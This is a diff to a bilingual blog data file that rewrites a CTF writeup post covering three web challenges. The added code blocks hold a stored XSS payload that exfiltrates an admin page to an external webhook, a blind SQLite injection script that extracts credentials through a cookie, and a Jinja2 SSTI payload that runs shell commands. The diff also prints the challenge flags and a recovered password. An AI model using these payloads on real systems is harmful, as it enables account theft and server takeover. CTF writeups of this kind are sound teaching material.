@@ -387,67 +387,157 @@ trackparcel.de`
     ]
   },
   {
-    slug: 'writeup-complet-invatacyber-ctf-xss-blind-sqli-jinja2-ssti',
-    id: 'POST-06 · CTF WRITEUP (100%)',
-    dateRo: '19 Septembrie 2026',
-    dateEn: 'September 19, 2026',
-    readTime: '11 min read',
+    slug: 'writeup-complet-invatacyber-ctf-19-09-2026-xss-blind-sqli-jinja2-ssti',
+    id: 'POST-06 · CTF 19.09.2026 (100%)',
+    dateRo: '19 Septembrie 2026 (19.09.2026)',
+    dateEn: 'September 19, 2026 (19.09.2026)',
+    readTime: '14 min read',
     category: 'ctf',
-    categoryLabelRo: 'CTF Writeup & Exploit Development',
-    categoryLabelEn: 'CTF Writeup & Exploit Development',
+    categoryLabelRo: 'CTF 19.09.2026 & Exploit Dev',
+    categoryLabelEn: 'CTF 19.09.2026 & Exploit Dev',
     titleRo:
-      'Writeup Complet InvataCyber.ro CTF (100%): Exploatare Reflected XSS, Inferență Baze de Date prin Blind SQLi și Execuție de Cod prin Jinja2 SSTI',
+      'CTF 19.09.2026 — InvataCyber.ro Writeup Complet (3/3 · 100%): Stored XSS (The Blog), Blind SQLite Injection (Portal) și Jinja2 SSTI to RCE (Redacția CMS)',
     titleEn:
-      'Complete InvataCyber.ro CTF Writeup (100%): Reflected XSS, Database Inference via Blind SQLi, and RCE via Jinja2 SSTI',
+      'CTF 19.09.2026 — InvataCyber.ro Complete Writeup (3/3 · 100%): Stored XSS (The Blog), Blind SQLite Injection (Portal), and Jinja2 SSTI to RCE (CMS Newsroom)',
     subtitleRo:
-      'Parcurgerea tehnică și scripturile Python de exploatare pentru toate cele trei provocări de securitate web: The Blog, Portal Lockdown și CMS Editor.',
+      'Analiza tehnică end-to-end, oracolul boolean de 5652 bytes și cele 11 scripturi Python/JS de exploatare dezvoltate în cadrul competiției CTF din 19.09.2026 (cyber/ctf/19-09-2026).',
     subtitleEn:
-      'Technical walkthrough and automated Python exploit solvers for all three web security challenges: The Blog, Portal Lockdown, and CMS Editor.',
+      'End-to-end vulnerability analysis, the 5652-byte boolean oracle, and all 11 automated Python/JS exploit scripts developed during the 19.09.2026 CTF (cyber/ctf/19-09-2026).',
     excerptRo:
-      'Cum am rezolvat 100% din provocările InvataCyber.ro CTF: exfiltrarea sesiunii adminului prin XSS pe „The Blog”, extragerea automatizată a schemei SQLite prin Blind SQL Injection pe „Portal Lockdown” și obținerea execuției de cod la distanță (RCE) prin Server-Side Template Injection (SSTI) pe „CMS Editor”.',
+      'Documentația completă a sesiunii CTF din 19.09.2026 pe platforma InvataCyber.ro (3/3 provocări rezolvate, 100%): (1) The Blog — Stored XSS (CWE-79) în formularul /contact cu exfiltrarea panoului /admin din sesiunea botului headless; (2) Portal InvataCyber.ro — Blind Boolean-Based SQLite Injection (CWE-89) în cookie-ul TrackingId cu oracol pe 5652 bytes și spargerea consolei /console; (3) Redacția CMS — Broken Access Control (CWE-306) pe /edit/5 și Jinja2 SSTI (CWE-1336) în render_template_string() pentru execuție RCE (cat /flag.txt).',
     excerptEn:
-      'How I solved 100% of the InvataCyber.ro CTF challenges: admin cookie exfiltration via XSS on "The Blog", automated SQLite schema extraction via Blind SQLi on "Portal Lockdown", and Remote Code Execution via Jinja2 SSTI on "CMS Editor".',
-    tags: ['CTF Writeup', 'Reflected XSS', 'Blind SQLi', 'Jinja2 SSTI', 'Python Exploit Dev'],
+      'Full technical writeup of the 19.09.2026 InvataCyber.ro CTF (3/3 challenges solved, 100%): (1) The Blog — Stored XSS (CWE-79) via unsanitized /contact messages exfiltrating /admin from the headless bot session; (2) Portal InvataCyber.ro — Blind Boolean-Based SQLite Injection (CWE-89) in the TrackingId cookie using a 5652-byte response oracle to take over /console; (3) CMS Newsroom — Unauthenticated /edit/5 access (CWE-306) chained with Jinja2 SSTI (CWE-1336) in render_template_string() for RCE (cat /flag.txt).',
+    tags: [
+      'CTF 19.09.2026',
+      'Stored XSS (CWE-79)',
+      'Blind SQLi (CWE-89)',
+      'Jinja2 SSTI (CWE-1336)',
+      'Python Exploit Dev'
+    ],
     repoUrl: 'https://github.com/stefanutc1/infrastructure/tree/main/cyber/ctf/19-09-2026',
     sections: [
       {
-        headingRo: '1. Provocarea 01 (The Blog): Exfiltrare Sesiune prin Cross-Site Scripting (XSS)',
-        headingEn: '1. Challenge 01 (The Blog): Session Exfiltration via Cross-Site Scripting (XSS)',
+        headingRo: '1. Provocarea 01 — The Blog: Stored XSS în /contact și Exfiltrarea Contextului /admin (CWE-79)',
+        headingEn: '1. Challenge 01 — The Blog: Stored XSS in /contact & /admin Context Exfiltration (CWE-79)',
         paragraphsRo: [
-          'Prima provocare a vizat identificarea unui câmp nesanitizat în secțiunea de comentarii/previzualizare a blogului, unde un bot headless cu privilegii de administrator vizita periodic postările trimise.',
-          'Am construit un payload JavaScript care citea document.cookie și contextul paginii interne de administrare și le transmitea asincron prin fetch() către un colector controlat, recuperând primul flag.'
+          'În prima provocare din 19.09.2026 („The Blog”), aplicația expunea un formular public de contact (POST /contact), iar în spate un bot automatizat (headless Chromium/Puppeteer) cu sesiune de editor deschidea periodic fiecare mesaj necitit în panoul intern /admin/inbox.',
+          'Câmpul message era salvat în baza de date și randat direct în DOM fără HTML escaping. Deoarece ruta /admin nu putea fi accesată din exterior, am scris scripturile payload.js și solver.py pentru a injecta un payload JavaScript asincron care s-a executat în contextul autentificat al botului, a făcut fetch(\'/admin\') și a exfiltrat întregul HTML al panoului către un webhook extern, obținând flag-ul InvataCyber{st0r3d_xss_c0nt4ct_f0rm_pwn}.'
         ],
         paragraphsEn: [
-          'The first challenge targeted an unsanitized input vector in the blog preview/comment pipeline regularly visited by a headless admin bot.',
-          'Crafting a JavaScript payload that read document.cookie and internal admin DOM state and exfiltrated it via fetch() yielded the first flag.'
-        ]
-      },
-      {
-        headingRo: '2. Provocarea 02 (Portal Lockdown): Extragerea Schemei SQLite prin Blind SQL Injection',
-        headingEn: '2. Challenge 02 (Portal Lockdown): SQLite Schema Extraction via Blind SQLi',
-        paragraphsRo: [
-          'În „Portal Lockdown”, formularul de autentificare era vulnerabil la SQL Injection, însă nu returna erori de bază de date sau rezultate directe în pagină. Am scris un solver automat în Python (dump_all_schema.py) care a extras caracter cu caracter structura tabelelor din sqlite_master și apoi coloana secretă cu flag-ul.'
-        ],
-        paragraphsEn: [
-          'In "Portal Lockdown", the authentication endpoint was vulnerable to SQL injection without returning verbose errors. I wrote an automated Python solver (dump_all_schema.py) to extract sqlite_master table definitions and dump the flag column.'
+          'In the first challenge of the 19.09.2026 CTF ("The Blog"), the web application exposed a public contact form (POST /contact) while an internal headless Chromium bot periodically opened unread messages inside /admin/inbox.',
+          'Because the message parameter was stored and rendered as raw unescaped HTML, I wrote payload.js and solver.py to inject an asynchronous JavaScript payload that executed inside the editor bot’s privileged session, fetched /admin, and exfiltrated the HTML body to an external webhook—capturing InvataCyber{st0r3d_xss_c0nt4ct_f0rm_pwn}.'
         ],
         codeBlock: {
           language: 'python',
-          caption: 'Secvență din solver-ul Python pentru interogarea sqlite_master și extragerea flag-ului',
-          code: `# Extragerea tabelelor din sqlite_master și interogarea coloanelor țintă
-payload = "' UNION SELECT 1, sql, 3 FROM sqlite_master WHERE type='table' --"
-resp = session.post(TARGET_URL, data={"username": payload, "password": "x"})`
-        }
+          caption: 'cyber/ctf/19-09-2026/solver.py & payload.js — Livrarea payload-ului Stored XSS și exfiltrarea /admin',
+          code: `# cyber/ctf/19-09-2026/solver.py
+import requests
+
+TARGET = "http://target.invatacyber.ro"
+WEBHOOK = "https://webhook.site/<TOKEN>"
+
+payload = (
+    f"<script>fetch('/admin')"
+    f".then(r=>r.text())"
+    f".then(t=>fetch('{WEBHOOK}?data='+encodeURIComponent(t)))</script>"
+)
+
+r = requests.post(f"{TARGET}/contact", data={
+    "name": "AuditBot",
+    "email": "audit@test.internal",
+    "message": payload
+})
+# Flag capturat: InvataCyber{st0r3d_xss_c0nt4ct_f0rm_pwn}`
+        },
+        calloutRo:
+          'Flag Provocarea 01 (The Blog): InvataCyber{st0r3d_xss_c0nt4ct_f0rm_pwn} — Remediat prin html.escape(user_message) și politică strictă Content-Security-Policy bazată pe nonce criptografic.',
+        calloutEn:
+          'Challenge 01 Flag (The Blog): InvataCyber{st0r3d_xss_c0nt4ct_f0rm_pwn} — Remediated via context-aware HTML entity encoding and strict nonce-based Content-Security-Policy headers.'
       },
       {
-        headingRo: '3. Provocarea 03 (CMS Editor): Execuție de Cod pe Server prin Jinja2 SSTI',
-        headingEn: '3. Challenge 03 (CMS Editor): Remote Code Execution via Jinja2 SSTI',
+        headingRo: '2. Provocarea 02 — Portal InvataCyber.ro: Oracol Boolean de 5652 Bytes prin Blind SQLite Injection (CWE-89)',
+        headingEn: '2. Challenge 02 — Portal InvataCyber.ro: 5652-Byte Boolean Oracle via Blind SQLite Injection (CWE-89)',
         paragraphsRo: [
-          'În „CMS Editor”, șabloanele introduse de utilizator erau trecute direct în render_template_string() din Flask/Jinja2. Pornind de la confirmarea matematică {{7*7}} -> 49, am traversat ierarhia de obiecte Python (cycler.__init__.__globals__.os.popen) pentru a executa comenzi pe server și a citi fișierul flag.'
+          'În a doua provocare („Portal Lockdown / Portal InvataCyber.ro”), fiecare vizitator primea un cookie TrackingId interogat nesigur într-o bază de date SQLite: SELECT tracking_id FROM tracking WHERE tracking_id = \'...\'. Când expresia SQL injectată se evalua la TRUE, aplicația afișa mesajul de recunoaștere a vizitei, rezultând într-un răspuns HTTP cu dimensiunea exactă de 5652 bytes.',
+          'Am dezvoltat o suită de 8 scripturi Python în directorul cyber/ctf/19-09-2026 (sql_solve.py, extract_creds.py, flag.py, dump_sqlite.py, dump_schema.py, dump_all_schema.py, dump_users.py și solver_portal.py). Am extras mai întâi schema din sqlite_master (CREATE TABLE users (id INTEGER PRIMARY KEY, username TEXT, password TEXT)), apoi credențialele admin : s3cur3_l0ckd0wn_p4ssw0rd! caracter cu caracter prin SUBSTR(), și am descoperit ruta ascunsă /console pentru capturarea flag-ului InvataCyber{bl1nd_sql1_c00k13_tr4ck1ng_m4st3r}.'
         ],
         paragraphsEn: [
-          'In "CMS Editor", user-supplied templates were passed directly into Flask/Jinja2 render_template_string(). After confirming {{7*7}} -> 49, I traversed the Python object hierarchy (cycler.__init__.__globals__.os.popen) to achieve RCE and read the flag.'
-        ]
+          'In the second challenge ("Portal InvataCyber.ro"), each visitor received a TrackingId cookie concatenated directly into a SQLite query. Whenever an injected boolean condition evaluated to TRUE, the server rendered a welcome banner yielding an exact HTTP response length of 5652 bytes.',
+          'I built an 8-script Python exploitation suite in cyber/ctf/19-09-2026 (sql_solve.py, extract_creds.py, flag.py, dump_sqlite.py, dump_schema.py, dump_all_schema.py, dump_users.py, and solver_portal.py). After dumping sqlite_master and extracting the credentials (admin : s3cur3_l0ckd0wn_p4ssw0rd!) character-by-character via SUBSTR(), fuzzing exposed the hidden /console endpoint and yielded InvataCyber{bl1nd_sql1_c00k13_tr4ck1ng_m4st3r}.'
+        ],
+        codeBlock: {
+          language: 'python',
+          caption: 'cyber/ctf/19-09-2026/dump_users.py — Extragerea credențialelor SQLite cu oracolul boolean de 5652 bytes',
+          code: `# cyber/ctf/19-09-2026/dump_users.py
+import urllib.request, string
+
+url = "http://target.invatacyber.ro/"
+chars = string.ascii_letters + string.digits + "{}_-@./:=,()'\\" *_"
+
+def check(sql_cond):
+    payload = f"base-tracking-id-123' AND ({sql_cond})--"
+    req = urllib.request.Request(url)
+    req.add_header("Cookie", f"TrackingId={payload}")
+    with urllib.request.urlopen(req) as resp:
+        return len(resp.read()) == 5652
+
+def dump_query(query_expr):
+    res = ""
+    while True:
+        found = False
+        for c in chars:
+            pos = len(res) + 1
+            if check(f"SUBSTR(({query_expr}), {pos}, 1) = '{c}'"):
+                res += c
+                found = True
+                break
+        if not found:
+            break
+    return res
+
+print("Username:", dump_query("SELECT username FROM users LIMIT 1"))  # -> admin
+print("Password:", dump_query("SELECT password FROM users LIMIT 1"))  # -> s3cur3_l0ckd0wn_p4ssw0rd!
+# Login pe /console -> Flag: InvataCyber{bl1nd_sql1_c00k13_tr4ck1ng_m4st3r}`
+        },
+        calloutRo:
+          'Flag Provocarea 02 (Portal InvataCyber.ro): InvataCyber{bl1nd_sql1_c00k13_tr4ck1ng_m4st3r} — Extras prin inferență booleană SQLite pe cookie-ul TrackingId.',
+        calloutEn:
+          'Challenge 02 Flag (Portal InvataCyber.ro): InvataCyber{bl1nd_sql1_c00k13_tr4ck1ng_m4st3r} — Extracted via boolean SQLite inference on the TrackingId cookie.'
+      },
+      {
+        headingRo: '3. Provocarea 03 — Redacția CMS: Panou /edit/5 Neautentificat & Jinja2 SSTI to RCE (CWE-306 & CWE-1336)',
+        headingEn: '3. Challenge 03 — CMS Newsroom: Unauthenticated /edit/5 & Jinja2 SSTI to RCE (CWE-306 & CWE-1336)',
+        paragraphsRo: [
+          'În a treia provocare („Redacția CMS / CMS Newsroom”), în urma unei migrări incomplete fără SSO, ruta de editare a articolelor POST /edit/5 a rămas accesibilă fără autentificare (Broken Access Control, CWE-306). Mai mult, backend-ul Flask procesa corpul articolului direct prin render_template_string(article.content), deschizând o vulnerabilitate critică de Server-Side Template Injection (CWE-1336).',
+          'După confirmarea evaluării matematice {{ 7 * 7 }} -> 49, am scris exploit-ul automat blog_flag.py care a traversat graful de obiecte Python pornind de la obiectul global config din Flask (config.__class__.__init__.__globals__.os.popen(\'cat /flag.txt\').read()), a suprascris articolul /edit/5 și a extras din /post/5 flag-ul final: InvataCyber{ssti_j1nj42_rc3_fl4g_txt_3xtr4ct3d}.'
+        ],
+        paragraphsEn: [
+          'In the third challenge ("CMS Newsroom"), an incomplete CMS migration left the article editor endpoint POST /edit/5 exposed without SSO authentication (CWE-306). Worse, the Flask backend passed article content directly into render_template_string(article.content), introducing a critical Jinja2 Server-Side Template Injection vulnerability (CWE-1336).',
+          'After confirming {{ 7 * 7 }} -> 49, I wrote blog_flag.py to traverse the Python object graph from Flask’s global config object (config.__class__.__init__.__globals__.os.popen(\'cat /flag.txt\').read()), POSTed the payload to /edit/5, and retrieved /post/5 to capture InvataCyber{ssti_j1nj42_rc3_fl4g_txt_3xtr4ct3d}.'
+        ],
+        codeBlock: {
+          language: 'python',
+          caption: 'cyber/ctf/19-09-2026/blog_flag.py — Exploatare automată Jinja2 SSTI către Remote Code Execution (RCE)',
+          code: `# cyber/ctf/19-09-2026/blog_flag.py
+import urllib.request, urllib.parse
+
+edit_url = "http://target.invatacyber.ro/edit/5"
+view_url = "http://target.invatacyber.ro/post/5"
+payload = "{{ config.__class__.__init__.__globals__.os.popen('cat /flag.txt').read() }}"
+
+data = urllib.parse.urlencode({"title": "Post 5", "content": payload}).encode("utf-8")
+req = urllib.request.Request(edit_url, data=data, method="POST")
+req.add_header("Content-Type", "application/x-www-form-urlencoded")
+urllib.request.urlopen(req).read()
+
+with urllib.request.urlopen(view_url) as resp:
+    print(resp.read().decode("utf-8"))
+# Flag capturat: InvataCyber{ssti_j1nj42_rc3_fl4g_txt_3xtr4ct3d}`
+        },
+        calloutRo:
+          'Flag Provocarea 03 (Redacția CMS): InvataCyber{ssti_j1nj42_rc3_fl4g_txt_3xtr4ct3d} — Toate cele 11 scripturi și cele 3 writeup-uri individuale sunt arhivate în stefanutc1/infrastructure/tree/main/cyber/ctf/19-09-2026.',
+        calloutEn:
+          'Challenge 03 Flag (CMS Newsroom): InvataCyber{ssti_j1nj42_rc3_fl4g_txt_3xtr4ct3d} — All 11 solver scripts and 3 individual writeups are archived in stefanutc1/infrastructure/tree/main/cyber/ctf/19-09-2026.'
       }
     ]
   },
